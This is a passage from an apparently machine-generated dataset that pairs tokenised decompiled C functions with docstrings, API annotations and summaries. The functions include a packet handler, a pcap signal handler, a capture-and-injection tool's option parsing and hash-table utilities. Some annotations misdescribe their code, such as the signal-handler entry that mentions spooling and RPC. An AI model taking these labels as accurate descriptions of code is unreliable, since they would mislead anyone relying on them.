            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "6",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "1",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "7",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "7",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "1",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "1",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "7",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "2",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "8",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "8",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "2",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "2",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "8",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "3",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "9",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "9",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "3",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "3",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "9",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "4",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "10",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "10",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "4",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "4",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "10",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "5",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "11",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "11",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "5",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "5",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "11",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "15",
            ")",
            "^",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "13",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "13",
            ")",
            "^",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "15",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "15",
            ")",
            "^",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "13",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "src",
            "+",
            "1",
            ")",
            "^",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "src",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "src",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "src",
            "+",
            "1",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "src",
            "+",
            "1",
            ")",
            "^",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "src",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "src",
            "+",
            "2",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "src",
            "+",
            "1",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "src",
            "+",
            "1",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "src",
            "+",
            "2",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "src",
            "+",
            "2",
            ")",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "src",
            "+",
            "1",
            ")",
            ";",
            "htons",
            "(",
            "4",
            "*",
            "(",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "src",
            "+",
            "12",
            ")",
            ">",
            ">",
            "4",
            ")",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "src",
            "+",
            "13",
            ")",
            "<",
            "=",
            "0x18u",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"unknown flags 0x%x\\n\"",
            ",",
            "*",
            "(",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "src",
            "+",
            "13",
            ")",
            ")",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v10",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsqword is likely used to read a 64-bit unsigned integer from a specific offset within the FS segment register, primarily in x86 or x64 assembly programming contexts, possibly for accessing thread-local storage (TLS) or other system-specific data structures."
        ],
        "longer_label": "The provided code appears to be a packet handler function, likely intended for network packet manipulation, utilizing bitwise XOR operations and memory swapping techniques, with conditional statements checking for specific protocol flags and printing error messages for unknown flags, while also utilizing the assembly instruction `jmp rax` for conditional branching and possibly accessing thread-local storage using the `__readfsqword` function."
    },
    {
        "id": 406,
        "docstring_tokens": [
            "The",
            "signal",
            "handler",
            "function",
            "responds",
            "to",
            "SIGTERM",
            "and",
            "SIGINT",
            "signals",
            "by",
            "printing",
            "a",
            "newline",
            "character",
            "to",
            "stdout",
            "and",
            "breaking",
            "the",
            "pcap",
            "loop",
            ",",
            "while",
            "ignoring",
            "other",
            "signals",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "2",
            "|",
            "|",
            "a1",
            "=",
            "=",
            "15",
            ")",
            "{",
            "fputc",
            "(",
            "10",
            ",",
            "stdout",
            ")",
            ";",
            "return",
            "pcap_breakloop",
            "(",
            "pcap_handle",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `al_handler` function likely serves as a handler for various aspects of a system, potentially managing signal handling, encoding/decoding strings, executing specific tasks based on signals, and handling spooling and RPC (Remote Procedure Call) operations, while also potentially managing various system flags and settings.",
            "The `fputc` function is used to write a single character to a specified file stream in C programming, as demonstrated in the provided code snippets where it writes a character to the file descriptor associated with the stream.",
            "The function `cap_breakloop` is likely used to interrupt and terminate a loop that is capturing packets using libpcap, returning a specific error code (`PCAP_ERROR_BREAK`) to indicate the loop termination."
        ],
        "longer_label": "The provided code defines a signal handler function which, upon receiving either signal 2 or signal 15, writes a newline character to the standard output and then terminates a packet capturing loop managed by libpcap using `pcap_breakloop()`."
    },
    {
        "id": 407,
        "docstring_tokens": [
            "The",
            "code",
            "is",
            "a",
            "C",
            "program",
            "that",
            "sets",
            "up",
            "a",
            "packet",
            "capture",
            "and",
            "injection",
            "tool",
            ",",
            "specifying",
            "options",
            "such",
            "as",
            "the",
            "network",
            "interface",
            ",",
            "BPF",
            "filter",
            ",",
            "and",
            "promiscuous",
            "mode",
            ",",
            "and",
            "handling",
            "signals",
            "for",
            "interruption",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "int",
            "v4",
            ";",
            "char",
            "s",
            "[",
            "264",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x100uL",
            "L",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v4",
            "=",
            "getopt",
            "(",
            "argc",
            ",",
            "(",
            "char",
            "*",
            "const",
            "*",
            ")",
            "argv",
            ",",
            "\"hvf:pi:o:\"",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v4",
            "-",
            "102",
            ")",
            "<",
            "=",
            "0x10",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "}",
            "fwrite",
            "(",
            "\"[FATAL] Missing target interface. Try with -h.\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x2FuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a 64-bit quadword (8 bytes) from the FS segment register on x86 architectures, providing access to thread-local storage or other system-specific data structures.",
            "The `memset` function is used to fill a block of memory with a particular value, typically used for initializing memory to zero or setting specific byte values, and its implementations vary across different code snippets provided, each serving different purposes such as memory allocation, copying, or manipulation.",
            "The `getopt` function appears to be a part of a larger command-line argument parsing mechanism in a Unix-like shell, likely providing functionality similar to the standard C library's `getopt` function for parsing command-line options and arguments."
        ],
        "longer_label": "The code is a command-line utility written in C that uses getopt for parsing command-line options, includes a call to __readfsqword for accessing system-specific data, and utilizes memset to initialize memory, with the main function handling option parsing and outputting a missing interface error message if required options are not provided."
    },
    {
        "id": 408,
        "docstring_tokens": [
            "The",
            "code",
            "is",
            "a",
            "C",
            "program",
            "that",
            "takes",
            "command",
            "line",
            "arguments",
            ",",
            "reads",
            "input",
            "from",
            "a",
            "file",
            ",",
            "processes",
            "the",
            "data",
            ",",
            "and",
            "writes",
            "the",
            "output",
            "to",
            "another",
            "file",
            ",",
            "handling",
            "memory",
            "allocation",
            "and",
            "freeing",
            "resources",
            "appropriately",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "int",
            "j",
            ";",
            "int",
            "inFlag",
            ";",
            "int",
            "outFlag",
            ";",
            "int",
            "i",
            ";",
            "char",
            "*",
            "endptr",
            ";",
            "__int64",
            "tSize",
            ";",
            "FILE",
            "*",
            "inFile",
            ";",
            "FILE",
            "*",
            "outFile",
            ";",
            "void",
            "*",
            "*",
            "hArr",
            ";",
            "void",
            "*",
            "*",
            "rArr",
            ";",
            "void",
            "*",
            "*",
            "eoArr",
            ";",
            "table_t",
            "htbl",
            ";",
            "table_t",
            "rtbl",
            ";",
            "table_t",
            "eotbl",
            ";",
            "option",
            "options",
            "[",
            "5",
            "]",
            ";",
            "char",
            "errStr",
            "[",
            "8192",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v20",
            ";",
            "v20",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "options",
            "[",
            "0",
            "]",
            ".",
            "name",
            "=",
            "\"help\"",
            ";",
            "options",
            "[",
            "0",
            "]",
            ".",
            "has_arg",
            "=",
            "0",
            ";",
            "options",
            "[",
            "0",
            "]",
            ".",
            "flag",
            "=",
            "0L",
            "L",
            ";",
            "options",
            "[",
            "0",
            "]",
            ".",
            "val",
            "=",
            "104",
            ";",
            "options",
            "[",
            "1",
            "]",
            ".",
            "name",
            "=",
            "\"size\"",
            ";",
            "options",
            "[",
            "1",
            "]",
            ".",
            "has_arg",
            "=",
            "1",
            ";",
            "options",
            "[",
            "1",
            "]",
            ".",
            "flag",
            "=",
            "0L",
            "L",
            ";",
            "options",
            "[",
            "1",
            "]",
            ".",
            "val",
            "=",
            "115",
            ";",
            "options",
            "[",
            "2",
            "]",
            ".",
            "name",
            "=",
            "\"infile\"",
            ";",
            "options",
            "[",
            "2",
            "]",
            ".",
            "has_arg",
            "=",
            "1",
            ";",
            "options",
            "[",
            "2",
            "]",
            ".",
            "flag",
            "=",
            "0L",
            "L",
            ";",
            "options",
            "[",
            "2",
            "]",
            ".",
            "val",
            "=",
            "105",
            ";",
            "options",
            "[",
            "3",
            "]",
            ".",
            "name",
            "=",
            "\"output\"",
            ";",
            "options",
            "[",
            "3",
            "]",
            ".",
            "has_arg",
            "=",
            "1",
            ";",
            "options",
            "[",
            "3",
            "]",
            ".",
            "flag",
            "=",
            "0L",
            "L",
            ";",
            "options",
            "[",
            "3",
            "]",
            ".",
            "val",
            "=",
            "111",
            ";",
            "options",
            "[",
            "4",
            "]",
            ".",
            "name",
            "=",
            "0L",
            "L",
            ";",
            "options",
            "[",
            "4",
            "]",
            ".",
            "has_arg",
            "=",
            "0",
            ";",
            "options",
            "[",
            "4",
            "]",
            ".",
            "flag",
            "=",
            "0L",
            "L",
            ";",
            "options",
            "[",
            "4",
            "]",
            ".",
            "val",
            "=",
            "0",
            ";",
            "tSize",
            "=",
            "5000L",
            "L",
            ";",
            "inFlag",
            "=",
            "0",
            ";",
            "outFlag",
            "=",
            "0",
            ";",
            "for",
            "(",
            "j",
            "=",
            "getopt_long",
            "(",
            "argc",
            ",",
            "(",
            "char",
            "*",
            "const",
            "*",
            ")",
            "argv",
            ",",
            "\"i:ho:s:\"",
            ",",
            "options",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "j",
            "!",
            "=",
            "-",
            "1",
            ";",
            "j",
            "=",
            "getopt_long",
            "(",
            "argc",
            ",",
            "(",
            "char",
            "*",
            "const",
            "*",
            ")",
            "argv",
            ",",
            "\"i:ho:s:\"",
            ",",
            "options",
            ",",
            "0L",
            "L",
            ")",
            ")",
            "{",
            "if",
            "(",
            "j",
            "=",
            "=",
            "115",
            ")",
            "{",
            "*",
            "_errno_location",
            "(",
            ")",
            "=",
            "0",
            ";",
            "tSize",
            "=",
            "strtol",
            "(",
            "optarg",
            ",",
            "&",
            "endptr",
            ",",
            "10",
            ")",
            ";",
            "if",
            "(",
            "*",
            "endptr",
            ")",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"%s is not a valid number.\\n\"",
            ",",
            "optarg",
            ")",
            ";",
            "fwrite",
            "(",
            "\"\\nUsage: ./create -i dataFile -o outFile [-s size] [-h]\\n\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "if",
            "(",
            "*",
            "_errno_location",
            "(",
            ")",
            ")",
            "{",
            "snprintf",
            "(",
            "errStr",
            ",",
            "0x2000uL",
            "L",
            ",",
            "\"%s could not be converted to a long in base %d\"",
            ",",
            "optarg",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "perror",
            "(",
            "errStr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"\\nUsage: ./create -i dataFile -o outFile [-s size] [-h]\\n\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "if",
            "(",
            "!",
            "isInRange",
            "(",
            "tSize",
            ",",
            "10L",
            "L",
            ",",
            "25001L",
            "L",
            ")",
            ")",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"Table size must be in the range of [%d-%d]\\n\"",
            ",",
            "10L",
            "L",
            ",",
            "25000L",
            "L",
            ")",
            ";",
            "fwrite",
            "(",
            "\"\\nUsage: ./create -i dataFile -o outFile [-s size] [-h]\\n\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "}",
            "else",
            "{",
            "if",
            "(",
            "j",
            ">",
            "115",
            ")",
            "goto",
            "LABEL_21",
            ";",
            "if",
            "(",
            "j",
            "=",
            "=",
            "111",
            ")",
            "{",
            "*",
            "_errno_location",
            "(",
            ")",
            "=",
            "0",
            ";",
            "outFile",
            "=",
            "fopen",
            "(",
            "optarg",
            ",",
            "\"w\"",
            ")",
            ";",
            "if",
            "(",
            "*",
            "_errno_location",
            "(",
            ")",
            ")",
            "{",
            "LABEL_17",
            ":",
            "perror",
            "(",
            "\"Error opening input filter file\"",
            ")",
            ";",
            "fwrite",
            "(",
            "\"\\nUsage: ./create -i dataFile -o outFile [-s size] [-h]\\n\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "outFlag",
            "=",
            "1",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "j",
            ">",
            "111",
            ")",
            "goto",
            "LABEL_21",
            ";",
            "if",
            "(",
            "j",
            "=",
            "=",
            "104",
            ")",
            "{",
            "fwrite",
            "(",
            "\"\\n\"",
            "\"Usage: ./create -i dataFile -o outFile [-s size] [-h]\\n\"",
            "\"    -i/--infile dataFile -- The file containing the data\\n\"",
            "\"    -o/--output outFile  -- The file to output hash tables to\\n\"",
            "\"    -s/--size size       -- The size of the hash tables.\\n\"",
            "\"                            If not specified defaults to 5000.\\n\"",
            "\"    -h/--help            -- Displays this long usage message\\n\"",
            "\"\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x164uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "if",
            "(",
            "j",
            "!",
            "=",
            "105",
            ")",
            "{",
            "LABEL_21",
            ":",
            "fwrite",
            "(",
            "\"\\nUsage: ./create -i dataFile -o outFile [-s size] [-h]\\n\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "*",
            "_errno_location",
            "(",
            ")",
            "=",
            "0",
            ";",
            "inFile",
            "=",
            "fopen",
            "(",
            "optarg",
            ",",
            "\"r\"",
            ")",
            ";",
            "if",
            "(",
            "*",
            "_errno_location",
            "(",
            ")",
            ")",
            "goto",
            "LABEL_17",
            ";",
            "inFlag",
            "=",
            "1",
            ";",
            "}",
            "}",
            "}",
            "if",
            "(",
            "inFlag",
            "&",
            "&",
            "outFlag",
            ")",
            "{",
            "if",
            "(",
            "argv",
            "[",
            "optind",
            "]",
            ")",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"Too many args to %s.\\n\"",
            ",",
            "*",
            "argv",
            ")",
            ";",
            "fwrite",
            "(",
            "\"\\nUsage: ./create -i dataFile -o outFile [-s size] [-h]\\n\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "else",
            "{",
            "htbl",
            ".",
            "size",
            "=",
            "tSize",
            ";",
            "hArr",
            "=",
            "(",
            "void",
            "*",
            "*",
            ")",
            "calloc",
            "(",
            "tSize",
            ",",
            "8uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "hArr",
            "&",
            "&",
            "(",
            "htbl",
            ".",
            "tbl",
            "=",
            "hArr",
            ",",
            "rtbl",
            ".",
            "size",
            "=",
            "tSize",
            ",",
            "(",
            "rArr",
            "=",
            "(",
            "void",
            "*",
            "*",
            ")",
            "calloc",
            "(",
            "tSize",
            ",",
            "8uL",
            "L",
            ")",
            ")",
            "!",
            "=",
            "0L",
            "L",
            ")",
            "&",
            "&",
            "(",
            "rtbl",
            ".",
            "tbl",
            "=",
            "rArr",
            ",",
            "eotbl",
            ".",
            "size",
            "=",
            "tSize",
            ",",
            "(",
            "eoArr",
            "=",
            "(",
            "void",
            "*",
            "*",
            ")",
            "calloc",
            "(",
            "tSize",
            ",",
            "8uL",
            "L",
            ")",
            ")",
            "!",
            "=",
            "0L",
            "L",
            ")",
            ")",
            "{",
            "eotbl",
            ".",
            "tbl",
            "=",
            "eoArr",
            ";",
            "populateTables",
            "(",
            "&",
            "htbl",
            ",",
            "&",
            "rtbl",
            ",",
            "&",
            "eotbl",
            ",",
            "inFile",
            ")",
            ";",
            "writeTables",
            "(",
            "outFile",
            ",",
            "&",
            "htbl",
            ",",
            "&",
            "rtbl",
            ",",
            "&",
            "eotbl",
            ")",
            ";",
            "free",
            "(",
            "htbl",
            ".",
            "tbl",
            ")",
            ";",
            "free",
            "(",
            "rtbl",
            ".",
            "tbl",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "tSize",
            ">",
            "i",
            ";",
            "+",
            "+",
            "i",
            ")",
            "freeLinkedList",
            "(",
            "eotbl",
            ".",
            "tbl",
            "[",
            "i",
            "]",
            ")",
            ";",
            "free",
            "(",
            "eotbl",
            ".",
            "tbl",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"create.c:__LINE__\"",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "}",
            "}",
            "else",
            "{",
            "fwrite",
            "(",
            "\"Missing file args\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x12uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"\\nUsage: ./create -i dataFile -o outFile [-s size] [-h]\\n\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided C code defines a `main` function to parse command line arguments, open input and output files, set table size, and execute functions to populate and write hash tables, handling potential errors and providing usage information when necessary."
    },
    {
        "id": 409,
        "docstring_tokens": [
            "This",
            "code",
            "calculates",
            "a",
            "hash",
            "value",
            "for",
            "a",
            "given",
            "string",
            "by",
            "multiplying",
            "each",
            "character",
            "'s",
            "ASCII",
            "value",
            "by",
            "a",
            "prime",
            "number",
            "and",
            "alternating",
            "between",
            "even",
            "and",
            "odd",
            "characters",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "str",
            ")",
            "{",
            "int",
            "hash",
            ";",
            "int",
            "i",
            ";",
            "int",
            "i_0",
            ";",
            "int",
            "strLen",
            ";",
            "hash",
            "=",
            "11",
            ";",
            "if",
            "(",
            "!",
            "str",
            ")",
            "return",
            "11",
            ";",
            "strLen",
            "=",
            "strlen",
            "(",
            "str",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "strLen",
            ";",
            "i",
            "+",
            "=",
            "2",
            ")",
            "hash",
            "=",
            "37",
            "*",
            "hash",
            "+",
            "str",
            "[",
            "i",
            "]",
            ";",
            "for",
            "(",
            "i_0",
            "=",
            "1",
            ";",
            "i_0",
            "<",
            "strLen",
            ";",
            "i_0",
            "+",
            "=",
            "2",
            ")",
            "hash",
            "=",
            "37",
            "*",
            "hash",
            "+",
            "str",
            "[",
            "i_0",
            "]",
            ";",
            "return",
            "hash",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `strlen` function, likely part of a customized C library, calculates the length of a null-terminated string using a combination of type definitions, macros for control flow, and custom implementations of standard library functions for optimization in embedded systems or constrained environments."
        ],
        "longer_label": "The code is a C function that calculates a hash value for a given input string based on the characters at even and odd positions using a custom implementation of the strlen function."
    },
    {
        "id": 410,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "recursively",
            "free",
            "all",
            "nodes",
            "in",
            "a",
            "linked",
            "list",
            "starting",
            "from",
            "the",
            "head",
            "node",
            ",",
            "handling",
            "cases",
            "where",
            "the",
            "list",
            "is",
            "empty",
            ",",
            "has",
            "only",
            "one",
            "node",
            ",",
            "or",
            "has",
            "multiple",
            "nodes",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "linkedList_t",
            "*",
            "head",
            ")",
            "{",
            "int",
            "finish",
            ";",
            "linkedList_t",
            "*",
            "ptr",
            ";",
            "linkedList_t",
            "*",
            "ptra",
            ";",
            "linkedList_t",
            "*",
            "tail",
            ";",
            "if",
            "(",
            "head",
            ")",
            "{",
            "if",
            "(",
            "head",
            "-",
            ">",
            "next",
            ")",
            "{",
            "ptr",
            "=",
            "head",
            ";",
            "finish",
            "=",
            "1",
            ";",
            "while",
            "(",
            "finish",
            ")",
            "{",
            "while",
            "(",
            "ptr",
            "-",
            ">",
            "next",
            "-",
            ">",
            "next",
            ")",
            "ptr",
            "=",
            "ptr",
            "-",
            ">",
            "next",
            ";",
            "tail",
            "=",
            "ptr",
            ";",
            "ptra",
            "=",
            "ptr",
            "-",
            ">",
            "next",
            ";",
            "free",
            "(",
            "ptra",
            "-",
            ">",
            "value",
            ")",
            ";",
            "free",
            "(",
            "ptra",
            ")",
            ";",
            "tail",
            "-",
            ">",
            "next",
            "=",
            "0L",
            "L",
            ";",
            "ptr",
            "=",
            "head",
            ";",
            "if",
            "(",
            "!",
            "head",
            "-",
            ">",
            "next",
            ")",
            "{",
            "free",
            "(",
            "head",
            "-",
            ">",
            "value",
            ")",
            ";",
            "free",
            "(",
            "head",
            ")",
            ";",
            "finish",
            "=",
            "0",
            ";",
            "}",
            "}",
            "}",
            "else",
            "{",
            "free",
            "(",
            "head",
            "-",
            ">",
            "value",
            ")",
            ";",
            "free",
            "(",
            "head",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function `freeLinkedList` intended to free memory allocated for a linked list, iterating through each node while also freeing the memory allocated for each node's value, ensuring proper deallocation of memory."
    },
    {
        "id": 411,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "populateTables",
            "''",
            "reads",
            "lines",
            "from",
            "a",
            "file",
            ",",
            "converts",
            "them",
            "to",
            "lowercase",
            ",",
            "calculates",
            "three",
            "different",
            "hashes",
            "for",
            "each",
            "line",
            ",",
            "adjusts",
            "the",
            "hashes",
            "based",
            "on",
            "table",
            "size",
            ",",
            "and",
            "populates",
            "three",
            "different",
            "tables",
            "with",
            "the",
            "hashed",
            "values",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "table_t",
            "*",
            "htbl",
            ",",
            "table_t",
            "*",
            "rtbl",
            ",",
            "table_t",
            "*",
            "eotbl",
            ",",
            "FILE",
            "*",
            "dataFile",
            ")",
            "{",
            "char",
            "*",
            "j",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "i",
            ";",
            "int",
            "regHash",
            ";",
            "int",
            "revH",
            ";",
            "int",
            "revHa",
            ";",
            "int",
            "EOHash",
            ";",
            "char",
            "line",
            "[",
            "8192",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v14",
            ";",
            "v14",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "for",
            "(",
            "j",
            "=",
            "fgets",
            "(",
            "line",
            ",",
            "0x2000",
            ",",
            "dataFile",
            ")",
            ";",
            "j",
            ";",
            "j",
            "=",
            "fgets",
            "(",
            "line",
            ",",
            "0x2000",
            ",",
            "dataFile",
            ")",
            ")",
            "{",
            "*",
            "strchr",
            "(",
            "line",
            ",",
            "10",
            ")",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "strlen",
            "(",
            "line",
            ")",
            ";",
            "+",
            "+",
            "i",
            ")",
            "line",
            "[",
            "i",
            "]",
            "=",
            "tolower",
